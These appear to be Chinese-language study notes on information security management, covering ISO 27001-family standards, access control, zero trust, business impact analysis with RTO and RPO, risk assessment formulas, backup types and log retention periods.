有三個類別，五個通道
    
### 類別
- PHYSSEC（Physical Security，實體安全）
- SPECSEC（Spectrum Security，頻譜安全）
- COMSEC（Communications Security，通訊安全）

### 通道

- PHYSSEC 下的 :
    - Physical 管道（如門禁、監視器、機房門鎖、電力）
    - Human 管道（例如社交工程、內部人員威脅、人員進出控管）

- SPECSEC 下的 :
    - Wireless 管道

- COMSEC 下的 :
    - Telecommunications 電信管道
    - Data Network 管道

## ISO
### ISO/IEC 27001:2022 資訊安全管理系統-要求事項
規定於組織之整體營運風險全景內、實作、運作、監視、查、維護及改進正式化之資訊安全管理系統 (ISMS)
![image](https://hackmd.io/_uploads/rJgiACVYlx.png)
 
:::info
補充 SLA（Service Level Agreement）

SLA 服務水準協議，明確服務提供的內容與範圍
ex :  
- 可用性（Availability）：系統每月可用時間 ≥ 99.9%
- 響應時間（Response Time）：客服回覆 ≤ 2 小時
- 處理時間（Resolution Time）：問題處理 ≤ 24 小時

責任與補償（Responsibilities & Penalties）
若服務未達 SLA，供應商可能需：
- 減免費用
- 補償額度或延長服務
- 承擔法律責任（依契約而定）

監控與報告（Monitoring & Reporting）
- 監控指標並定期報告給客戶，確保 SLA 被落實。
    
:::
    

### ISO/IEC 27021:2017 資安管理系統專業人員的能力要求
---
- 上面兩個是標準，可以驗證的
- 下面兩個是指南跟方法，教你怎麼做的
---
### ISO/IEC 27005:2022 資訊安全風險管理
### ISO/IEC 27007:2020 資訊安全管理系統稽核指引
### ISO 31000：風險管理—原則與指導綱要（Risk management – Principles and Guidelines）


## 存取控制三大步驟
1. 身分識別（Identification）
    - 表示你是誰
    - ex : 員工編號、提供身分證號碼 
2. 身分認證（Authentication）
    - 真的嗎讓我看看，分成以下幾種 :
        - 知識型：密碼、PIN 碼
        - 持有型：智慧卡、一次性密碼（OTP）、手機令牌
        - 特徵型：指紋、虹膜、人臉辨識
3. 授權（Authorization）
    - 你能幹嘛
    - ex : 進入大樓、把人家踢出群組
    
## 零信任 (Zero Trust) 

ZT 的重點在於保護資源
- 以 2020 年 8 月 NIST 公布的 SP 800-207 標準文件為主要參考
    
### ZAT 組成
- 政策引擎 (Policy Engine, PE) : 決定使用者或裝置能否存取資源
- 政策管理員 (Policy Administrator, PA) : 執行 PE 的決策，控制主體與資源之間的連線
- 政策執行點（Policy Enforcement Point, PEP）: 真正做事的地方
    
## 事件或風險評估的專有名詞
### 營運衝擊分析（Business Impact Analysis, BTA）
- 主要 : 作分析對組織營運的影響，決定哪些業務是關鍵，並說明為什麼需要持續運作。
- output : 
    - 各業務的關鍵性排序
    - 營運持續要求：如復原時間目標（RTO）、可容忍資料損失量（RPO）

![image](https://hackmd.io/_uploads/SkNYiyHKgg.png)


### RTO 補充 :

復原時間目標（Recovery Time Objective, RTO）
- 允許中斷的最長時間
- 通常以小時或分鐘表示

ex : RTO = 2 hr，我最多讓這個系統掛 2 hr

### RPO 
可容忍資料損失量（Recovery Point Objective, RPO）

- 可接受的資料最大損失量，用時間表是可以失去的資料量，主要用來看備份頻率
- 以時間長度表示

ex : RPO = 15 分鐘，我最多可以接受 15 min 內 log 不見
    
### 風險評鑑（Risk Assessment, RA）
風險評鑑流程報包括：識別背景、風險辨識、風險評估與分析、風險回應、風險監督

用於了解風險程度，幫助決策如何管理或控制風險
    
- 主要參考 ISO 31000 / ISO 27005
- 風險識別（Risk Identification） : 找出威脅、弱點、資產
- 風險分析（Risk Analysis）: 評估發生機率與可能損失
    - 風險評估分為定性 & 定量
        - 定性 : 像是風險低中高、不使用精確數字
        - 定量 : 數字或公式計算風險的財務損失或發生概率
            - SLE / ARO / ALE 
            - 後果/機率矩陣（Impact / Likelihood Matrix）
     
        ### SLE / ARO / ALE  補充
        - Single Loss Expectancy（單一損失預期值） : 單次事件造成的損失金額 = 資產價值×暴露因子(EF)
            > EF : 資產價值可能損失的比例
        - Annual Rate of Occurrence（年度發生比率） : 風險一年內發生次數
        - Annual Loss Expectancy（年度損失預期值） : 一年可能造成的平均損失 = SLE×ARO
   
- 風險評量（Risk Evaluation） : 
    - 判斷風險是否可接受
    - 決定風險處理策略（降低、移轉、接受、避免）
    
![image](https://hackmd.io/_uploads/HkmjC1rFee.png)

## 備份管理
    
### 完整備份（Full Backup）: 備份所有資料
- 缺點 : 耗時長、佔用空間大
### 差異備份（Differential Backup）: 自上次完整備份後變動的全部資料
- 缺點：隨時間增加，差異檔案會變大
### 增量備份（Incremental Backup）: 只加新增或修改的資料
    
## 資安責任分級
分級主要考量 :
- 機關重要性（核心業務、公共服務影響）
- 資料敏感性（個資、財務、國家安全等）
- 系統關鍵性（中斷對業務影響程度）
    
### 日誌保存期限
根據分級決定日誌要保留多久，通常只有最低的下限沒有最高的上限

- 普通（低）: 至少 6 個月
- 重要（中）: 至少 12 個月
- 高（高） : 至少 12 個月，可視風險延長
    
### 保存項目
1. 作業系統日誌
2. 網站日誌
3. 應用程式日誌
4. 登入日誌


# ref
1. 魏銪志, 資訊安全規劃實務
2. 林敬皇, 資訊安全防護實務
3. https://github.com/HeyMrSalt/iPAS-Specialist-Notes
